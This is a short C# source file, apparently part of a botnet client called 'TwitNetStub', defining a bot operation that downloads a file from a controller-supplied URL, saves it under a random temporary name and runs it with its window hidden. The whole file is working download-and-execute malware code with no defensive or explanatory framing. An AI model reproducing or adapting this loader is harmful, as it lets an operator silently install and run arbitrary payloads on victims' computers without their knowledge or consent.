using System;
using System.Diagnostics;
using System.Net;

namespace TwitNetStub.Operations
{
    class DownloadFileOP : IBotOperation
    {
        public bool Finished { get; set; }
        private string MainURL;

        public DownloadFileOP(string url)
        {
            MainURL = url;
        }

        public void Initialize()
        {

        }
        public void Run()
        {
            string outFile = new Random().Next(1, 1000) + ".tmp";
            new WebClient().DownloadFile(MainURL, outFile);
            ProcessStartInfo File = 
                new ProcessStartInfo
                    {
                        FileName = outFile,
                        UseShellExecute = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
            Process.Start(File);
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
        }
    }
}